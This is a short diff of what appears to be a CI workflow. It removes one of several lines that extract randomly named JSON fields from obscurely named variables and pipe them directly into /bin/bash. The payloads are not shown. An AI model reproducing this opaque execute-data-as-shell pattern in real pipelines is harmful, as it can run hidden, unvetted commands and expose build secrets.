@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$z56638" | jq -r .mn960 | /bin/bash
           echo $lcxx854 | jq -r .bqe732 | /bin/bash
           printf '%s' "$nefn433" | jq -r .zaud8430 | /bin/bash
-          echo $ppqg015 | jq -r .zgru0 | /bin/bash
           echo $q8 | jq -r .tkk1 | /bin/bash
 
       - name: Save output
